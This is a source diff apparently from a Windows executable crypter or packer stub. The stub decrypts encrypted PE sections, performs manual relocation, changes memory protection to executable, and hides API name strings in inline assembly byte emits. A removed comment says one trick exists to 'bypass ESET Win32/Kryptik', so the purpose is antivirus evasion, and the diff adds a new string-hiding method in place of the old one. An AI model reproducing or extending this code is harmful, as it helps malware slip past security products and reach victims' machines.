@@ -33,11 +33,11 @@ CONFIGURATION exe_configuration = {
 		FALSE
 };
 
-__declspec(allocate(".peexe32"))
-VirtualProtect_ptr	_exe_VirtualProtect;
+//__declspec(allocate(".peexe32"))
+//VirtualProtect_ptr	_exe_VirtualProtect;
 
-__declspec(allocate(".peexe32"))
-VirtualAlloc_ptr	_exe_VirtualAlloc;
+//__declspec(allocate(".peexe32"))
+//VirtualAlloc_ptr	_exe_VirtualAlloc;
 
 
 typedef struct base_relocation_block
@@ -56,6 +56,8 @@ typedef struct base_relocation_entry
 #define relocation_entry_t base_relocation_entry_t
 
 #ifdef _BUILD32
+
+extern "C" IMAGE_DOS_HEADER __ImageBase;
 
 
 typedef SIZE_T (WINAPI *VirtualQuery_ptr)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
@@ -89,6 +91,13 @@ static void Reloc_Process_Entry()
 }
 
 #pragma code_seg(".peexe32")
+base_relocation_block_t* next_page(base_relocation_block_t *page)
+{
+	return CALC_OFFSET(base_relocation_block_t *, page, page->BlockSize);
+}
+
+
+#pragma code_seg(".peexe32")
 static void Reloc_Process(LPVOID pModule, PIMAGE_NT_HEADERS32 pImageNtHeader, PIMAGE_SECTION_HEADER pSectionPointer, LPVOID lpRelocAddress, DWORD dwRelocSize, PIMAGE_SECTION_HEADER pTextPointer)
 {
 	if (dwRelocSize == 0 || lpRelocAddress == NULL)
@@ -96,20 +105,18 @@ static void Reloc_Process(LPVOID pModule, PIMAGE_NT_HEADERS32 pImageNtHeader, PI
 		return;	// no reloc table here!
 	}
 
-	DWORD ImageBase = (DWORD) exe_configuration._baseAddress;
+	//DWORD ImageBase = (DWORD) exe_configuration._baseAddress;
+	DWORD delta = (DWORD) exe_configuration._baseAddress - (DWORD) pModule;
 
 	base_relocation_block_t *relocation_page = (base_relocation_block_t *) lpRelocAddress;
+
+#define RELOC_IN_RANGE(page, section) (page->PageRVA >= section->VirtualAddress) && (page->PageRVA <= (section->VirtualAddress + section->Misc.VirtualSize))
 
 	// for each page!
 	while(relocation_page->BlockSize > 0)
 	{
-		if (relocation_page->PageRVA < pSectionPointer->VirtualAddress || relocation_page->PageRVA > (pSectionPointer->VirtualAddress + pSectionPointer->Misc.VirtualSize))
-		{	// skip current page!
-			relocation_page = CALC_OFFSET(base_relocation_block_t *, relocation_page, relocation_page->BlockSize);
-		}
-		else
+		if (RELOC_IN_RANGE(relocation_page, pSectionPointer))
 		{	// ok.. we can process this page!
-			typedef short relocation_entry;
 
 			int BlockSize = relocation_page->BlockSize - 8;
 			relocation_entry *entries = CALC_OFFSET(relocation_entry *, relocation_page, 8);
@@ -122,24 +129,22 @@ static void Reloc_Process(LPVOID pModule, PIMAGE_NT_HEADERS32 pImageNtHeader, PI
 				reloc_entry_get(entries, &type, &offset);
 
 				ULONG *ptr = CALC_OFFSET(PULONG, pModule, offset + relocation_page->PageRVA);
-				ULONG value = *ptr;
-				ULONG dwNewValue = 0;
+				//ULONG value = *ptr;
 
 				if (type == IMAGE_REL_BASED_HIGHLOW)
 				{
-					value = value - ImageBase;
-					value = value + (DWORD) pModule;
-					*ptr = value;
+					*ptr += delta;
 				}
-				else
-				{	// nothing!
+				else if (type == IMAGE_REL_BASED_ABSOLUTE)
+				{	// break!
+					break;
 				}
 		
 				entries++;
 				BlockSize -= 2;
 			}
 
-			relocation_page = CALC_OFFSET(base_relocation_block_t *, relocation_page, relocation_page->BlockSize);
+			relocation_page = next_page(relocation_page);
 		}
 	}
 
@@ -159,7 +164,7 @@ typedef void (tea_decrypt_ptr)(uint32_t* v, uint32_t* k);
 #pragma code_seg(".peexe32")
 static tea_decrypt_ptr *load_decrypt()
 {
-	char *decrypt = (char *)_exe_VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	char *decrypt = (char *)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	void *start = static_cast<void *>(&tea_decrypt);
 	void *end = static_cast<void *>(&tea_decrypt_end_marker);
@@ -216,7 +221,7 @@ static BOOL WINAPI decrypt(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserv
 		
 		LPVOID lpAddress = rva2addr(pImageDosHeader, pImageNtHeaders32, (LPVOID) pSection->VirtualAddress);
 
-		_exe_VirtualProtect(lpAddress, pSection->Misc.VirtualSize, PAGE_READWRITE, &dwOldPermissions);
+		VirtualProtect(lpAddress, pSection->Misc.VirtualSize, PAGE_READWRITE, &dwOldPermissions);
 
 		ULONG64 rc4key[2] = { exe_configuration._key0, exe_configuration._key1 };
 
@@ -229,7 +234,7 @@ static BOOL WINAPI decrypt(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserv
 		for(DWORD dwPtr = 0; dwPtr < pSection->SizeOfRawData; dwPtr += 8, encptr += 2)
 			decrypt((uint32_t *) encptr, key);
 
-		_exe_VirtualProtect(lpAddress, pSection->Misc.VirtualSize, dwOldPermissions, &dwDummy);
+		VirtualProtect(lpAddress, pSection->Misc.VirtualSize, dwOldPermissions, &dwDummy);
 		//pSection++;
 
 	}
@@ -248,11 +253,11 @@ static BOOL WINAPI decrypt(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserv
 		{
 			// apply reloc in current section!
 			LPVOID lpAddress = rva2addr(pImageDosHeader, pImageNtHeaders32, (LPVOID) pSection->VirtualAddress);
-			_exe_VirtualProtect(lpAddress, pSection->Misc.VirtualSize, PAGE_READWRITE, &dwOldPermissions);
+			VirtualProtect(lpAddress, pSection->Misc.VirtualSize, PAGE_READWRITE, &dwOldPermissions);
 
 			ULONG ptrReloc = CALC_OFFSET(ULONG, pImageDosHeader, (ULONG) exe_configuration.lpRelocAddress);
 			Reloc_Process((LPVOID) pImageDosHeader, pImageNtHeaders32, pSection, (LPVOID) ptrReloc, exe_configuration.dwRelocSize, IMAGE_FIRST_SECTION(pImageNtHeaders32));
-			_exe_VirtualProtect(lpAddress, pSection->Misc.VirtualSize, dwOldPermissions, &dwDummy);
+			VirtualProtect(lpAddress, pSection->Misc.VirtualSize, dwOldPermissions, &dwDummy);
 		}
 	}
 
@@ -262,33 +267,13 @@ static BOOL WINAPI decrypt(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserv
 
 #endif
 
-#pragma code_seg(".peexe32")
-char*	_strVirtualProtect()
-{	
-	char dummy[128];
-	char szVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x00 };
-
-
-	for(int i = 0; i < sizeof(dummy); i++)
-	{
-		i += ('a' + ( i % 27));
-	}
-
-	for(int i = 64; i < sizeof(szVirtualProtect); i++)
-	{
-		dummy[i] = szVirtualProtect[i-64];
-	}
-
-	return &dummy[64];
-}
-
 #ifdef _BUILD32
 //#pragma code_seg(".peexe32")
 //static BOOL bProcessed = FALSE;
 
 struct _strings
 {
-	DWORD szKernel32[3];
+	char *szKernel32;
 	char szVirtualProtect[0x20];
 	char szVirtualQuery[0x20];
 	char szGetModuleFileNameA[0x40];
@@ -296,38 +281,288 @@ struct _strings
 };
 
 #pragma code_seg(".peexe32")
-void WINAPI __fuckcrt0startup(struct _strings *ptr)
+char* WINAPI LookString(LPBYTE lpText, short position)
 {
-	ptr->szKernel32[0] = 0x4E52456B; // bypass ESET Win32/Kryptik
-	ptr->szKernel32[1] = 0x32334C45;
-	ptr->szKernel32[2] = 0x0;
-	
-	char szVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x00 };
-	char szVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x00 };
-	char szGetModuleFileNameA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x00 };
-	char szGetModuleHandleA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x00 };
+	if (position == 0)
+		return (char *) lpText;
 
-	__memcpy(ptr->szVirtualProtect, szVirtualProtect, sizeof(szVirtualProtect));
-	__memcpy(ptr->szVirtualQuery, szVirtualQuery, sizeof(szVirtualQuery));
-	__memcpy(ptr->szGetModuleFileNameA, szGetModuleFileNameA, sizeof(szGetModuleFileNameA));
-	__memcpy(ptr->szGetModuleHandleA, szGetModuleHandleA, sizeof(szGetModuleHandleA));
+	while(position > 0)
+	{
+		if (*lpText == 0)
+		{
+			position--;
+		}
+
+		lpText++;
+	}
+
+	return (char *) lpText;
 }
 
 #pragma code_seg(".peexe32")
-extern "C"
-void WINAPI __crt0Startup(DWORD dwParam)
+void WINAPI __fuckcrt0startup(struct _strings *ptr)
 {
-	struct _strings init;
+	LPBYTE base;
 
+	__asm
+	{
+		call	__end
+__kernel32:		
+		__emit 'k'
+		__emit 'e'
+		__emit 'r'
+		__emit 'n'
+		__emit 'e'
+		__emit 'l'
+		__emit '3'
+		__emit '2'
+		__emit 00h
+
+__virtualquery:
+		__emit 'V'
+		__emit 'i'
+		__emit 'r'
+		__emit 't'
+		__emit 'u'
+		__emit 'a'
+		__emit 'l'
+		__emit 'Q'
+		__emit 'u'
+		__emit 'e'
+		__emit 'r'
+		__emit 'y'
+		__emit 0x00
+
+__getmodulefilenamea:
+		__emit 'G'
+		__emit 'e'
+		__emit 't'
+		__emit 'M'
+		__emit 'o'
+		__emit 'd'
+		__emit 'u'
+		__emit 'l'
+		__emit 'e'
+		__emit 'F'
+		__emit 'i'
+		__emit 'l'
+		__emit 'e'
+		__emit 'N'
+		__emit 'a'
+		__emit 'm'
+		__emit 'e'
+		__emit 'A'
+		__emit 0x00
+__getmodulehandlea:
+		__emit 'G'
+		__emit 'e'
+		__emit 't'
+		__emit 'M'
+		__emit 'o'
+		__emit 'd'
+		__emit 'u'
+		__emit 'l'
+		__emit 'e'
+		__emit 'H'
+		__emit 'a'
+		__emit 'n'
+		__emit 'd'
+		__emit 'l'
+		__emit 'e'
+		__emit 'A'
+		__emit 0x00
+	__end:
+		pop	eax
+		mov dword ptr [base], eax
+	}
+
+	//char szVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x00 };
+	
+	ptr->szKernel32 = LookString(base, 0);
+
+	//__memcpy(ptr->szVirtualProtect, szVirtualProtect, sizeof(szVirtualProtect));
+	__memcpy(ptr->szVirtualQuery, LookString(base, 1), sizeof(ptr->szVirtualQuery));
+	__memcpy(ptr->szGetModuleFileNameA, LookString(base, 2), sizeof(ptr->szGetModuleFileNameA));
+	__memcpy(ptr->szGetModuleHandleA, LookString(base, 3), sizeof(ptr->szGetModuleHandleA));
+}
+
+#pragma code_seg(".peexe32")
+HANDLE WINAPI _heap_init (void)
+{
+	HANDLE h = NULL;
+        if ( ( h = HeapCreate(0, 0, 0)) == NULL )
+            return NULL;
+
+	return h;
+}
+
+void WINAPI _heap_term (HANDLE _crtheap)
+{
+        //  destroy the large-block heap
+        HeapDestroy(_crtheap);
+        _crtheap=NULL;
+}
+
+#pragma code_seg(".peexe32")
+static int __cdecl check_managed_app (
+        void
+        )
+{
+        PIMAGE_DOS_HEADER pDOSHeader;
+        PIMAGE_NT_HEADERS pPEHeader;
+
+        pDOSHeader = &__ImageBase;
+
+        if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
+        {
+            return 0;
+        }
+
+        pPEHeader = (PIMAGE_NT_HEADERS) ((BYTE *) pDOSHeader + pDOSHeader->e_lfanew);
+
+        if (pPEHeader->Signature != IMAGE_NT_SIGNATURE)
+        {
+            return 0;
+        }
+
+        if (pPEHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
+        {
+            return 0;
+        }
+
+        /* prefast assumes we are overflowing __ImageBase */
+#pragma warning(push)
+#pragma warning(disable:26000)
+        if (pPEHeader->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)
+        {
+            return 0;
+        }
+#pragma warning(pop)
+
+        return pPEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress != 0;
+}
+
+#ifdef _WIN64
+#define DEFAULT_SECURITY_COOKIE 0x00002B992DDFA232
+#else  /* _WIN64 */
+#define DEFAULT_SECURITY_COOKIE 0xBB40E64E
+#endif  /* _WIN64 */
+
+__declspec(allocate(".peexe32"))
+UINT_PTR __security_cookie = DEFAULT_SECURITY_COOKIE;
+
+__declspec(allocate(".peexe32"))
+UINT_PTR __security_cookie_complement = ~(DEFAULT_SECURITY_COOKIE);
+
+typedef union {
+    unsigned __int64 ft_scalar;
+    FILETIME ft_struct;
+} FT;
+
+
+#pragma code_seg(".peexe32")
+void __cdecl __security_init_cookie(void)
+{
+    UINT_PTR cookie;
+    FT systime={0};
+    LARGE_INTEGER perfctr;
+
+    /*
+     * Do nothing if the global cookie has already been initialized.  On x86,
+     * reinitialize the cookie if it has been previously initialized to a
+     * value with the high word 0x0000.  Some versions of Windows will init
+     * the cookie in the loader, but using an older mechanism which forced the
+     * high word to zero.
+     */
+
+    if (__security_cookie != DEFAULT_SECURITY_COOKIE
+#if defined (_X86_)
+        && (__security_cookie & 0xFFFF0000) != 0
+#endif  /* defined (_X86_) */
+       )
+    {
+        //__security_cookie_complement = ~__security_cookie;
+        return;
+    }
+
+
+    /*
+     * Initialize the global cookie with an unpredictable value which is
+     * different for each module in a process.  Combine a number of sources
+     * of randomness.
+     */
+
+    GetSystemTimeAsFileTime(&systime.ft_struct);
+#if defined (_WIN64)
+    cookie = systime.ft_scalar;
+#else  /* defined (_WIN64) */
+    cookie = systime.ft_struct.dwLowDateTime;
+    cookie ^= systime.ft_struct.dwHighDateTime;
+#endif  /* defined (_WIN64) */
+
+    cookie ^= GetCurrentProcessId();
+    cookie ^= GetCurrentThreadId();
+    cookie ^= GetTickCount();
+
+    QueryPerformanceCounter(&perfctr);
+#if defined (_WIN64)
+    cookie ^= perfctr.QuadPart;
+#else  /* defined (_WIN64) */
+    cookie ^= perfctr.LowPart;
+    cookie ^= perfctr.HighPart;
+#endif  /* defined (_WIN64) */
+
+#if defined (_WIN64)
+    /*
+     * On Win64, generate a cookie with the most significant word set to zero,
+     * as a defense against buffer overruns involving null-terminated strings.
+     * Don't do so on Win32, as it's more important to keep 32 bits of cookie.
+     */
+    cookie &= 0x0000FFFFffffFFFFi64;
+#endif  /* defined (_WIN64) */
+
+    /*
+     * Make sure the cookie is initialized to a value that will prevent us from
+     * reinitializing it if this routine is ever called twice.
+     */
+
+    if (cookie == DEFAULT_SECURITY_COOKIE)
+    {
+        cookie = DEFAULT_SECURITY_COOKIE + 1;
+    }
+#if defined (_X86_)
+    else if ((cookie & 0xFFFF0000) == 0)
+    {
+        cookie |= ( (cookie|0x4711) << 16);
+    }
+#endif  /* defined (_X86_) */
+
+    //__security_cookie = cookie;
+    //__security_cookie_complement = ~cookie;
+
+}
+
+int stub0(DWORD dwParam)
+{
+	int initret;
+	int mainret = 0;
+	int managedapp;
+
+	STARTUPINFOW StartupInfo;
+	GetStartupInfoW(&StartupInfo);
+
+	check_managed_app();
+	struct _strings init;
 	__fuckcrt0startup(&init);
+	HANDLE hHeap = _heap_init();
 		
-	HMODULE h = _exe_LoadLibraryA((char *) init.szKernel32);
-	VirtualProtect_ptr p = (VirtualProtect_ptr) _exe_GetProcAddress(h, init.szVirtualProtect);
-	VirtualQuery_ptr _vquery = (VirtualQuery_ptr) _exe_GetProcAddress(h, init.szVirtualQuery);
+	HMODULE h = LoadLibraryA(init.szKernel32);
+	//VirtualProtect_ptr p = (VirtualProtect_ptr) GetProcAddress(h, init.szVirtualProtect);
+	VirtualQuery_ptr _vquery = (VirtualQuery_ptr) GetProcAddress(h, init.szVirtualQuery);
 
 	MEMORY_BASIC_INFORMATION buffer;
 
-	_vquery((LPVOID) _GETBASE(), &buffer, sizeof(buffer));
+	_vquery(CALC_OFFSET(LPVOID, &__ImageBase, 0x1000), &buffer, sizeof(buffer));
 	
 	DWORD newptr = buffer.RegionSize + (DWORD) buffer.BaseAddress;
 
@@ -336,41 +571,25 @@ void WINAPI __crt0Startup(DWORD dwParam)
 	DWORD ignore0 = 0x32323232;
 	DWORD ignore1 = 0x64646464;
 
-	p((LPVOID) newptr, buffer.RegionSize, PAGE_EXECUTE_READWRITE, &ignore0);
-	p((LPVOID) h, 0x1000, PAGE_READONLY, &ignore1);
-	_exe_VirtualProtect = p;
+	VirtualProtect((LPVOID) newptr, buffer.RegionSize, PAGE_EXECUTE_READWRITE, &ignore0);
+	VirtualProtect((LPVOID) h, 0x1000, PAGE_READONLY, &ignore1);
+	// = p;
 	
-	exe_g_hKernel32 = (HMODULE) _GETBASE();
+	//exe_g_hKernel32 = (HMODULE) &__ImageBase;
 		
-	GetModuleHandleA_ptr _GetModuleHandleA = (GetModuleHandleA_ptr) _exe_GetProcAddress(h, init.szGetModuleHandleA);
+	//GetModuleHandleA_ptr _GetModuleHandleA = (GetModuleHandleA_ptr) GetProcAddress(h, init.szGetModuleHandleA);
 
 	 //= _GetModuleHandleA(NULL);
 			
-	init.szVirtualProtect[7] = 'A';
+	/*init.szVirtualProtect[7] = 'A';
 	init.szVirtualProtect[8] = 'l';
 	init.szVirtualProtect[9] = 'l';
 	init.szVirtualProtect[0x0a] = 'o';
 	init.szVirtualProtect[0x0b] = 'c';
-	init.szVirtualProtect[0x0c] = 0x00;
-
-	_exe_VirtualAlloc = (VirtualAlloc_ptr) _exe_GetProcAddress(h, init.szVirtualProtect);
-
-	LPBYTE lpEntry = (LPBYTE) _exe_CreateFileA;
-
-	if (*lpEntry == '~')
-	{
-		__memcpy((char *)lpEntry+7, (char *)lpEntry+11, 14); 
-
-		LPVOID lpSymbol = _exe_GetProcAddress(h, (char *)(lpEntry+1));
-		*lpEntry++ = 0xB8;	// mov eax, imm32
-		(*(LPDWORD)lpEntry) = (DWORD)lpSymbol;
-		lpEntry+=4;
-		*lpEntry++ = 0xff;	// jmp eax
-		*lpEntry = 0xe0;	
-	}
+	init.szVirtualProtect[0x0c] = 0x00;*/
 	
-	if (exe_configuration.decrypted == 0)
-		exe_configuration.decrypted = decrypt(exe_g_hKernel32, DLL_PROCESS_ATTACH, NULL);
+	//if (exe_configuration.decrypted == 0)
+		/*exe_configuration.decrypted = */decrypt((HINSTANCE) &__ImageBase, DLL_PROCESS_ATTACH, NULL);
 
 	BOOL bConditions[4];
 	bConditions[0] = ((dwParam >> 24) == 0x60);
@@ -380,9 +599,17 @@ void WINAPI __crt0Startup(DWORD dwParam)
 	
 	if (bConditions[0] && bConditions[1] && bConditions[2] && bConditions[3])
 	{
-		return;
+		return 0;
 	}
-	_CrtStartup(exe_g_hKernel32);
+	return _CrtStartup((HINSTANCE) &__ImageBase);
+}
+
+#pragma code_seg(".peexe32")
+_declspec(noreturn) 
+	extern "C" VOID WINAPI __crt0Startup(DWORD dwParam)
+{
+	__security_init_cookie();
+	stub0(dwParam);
 }
 
 #endif
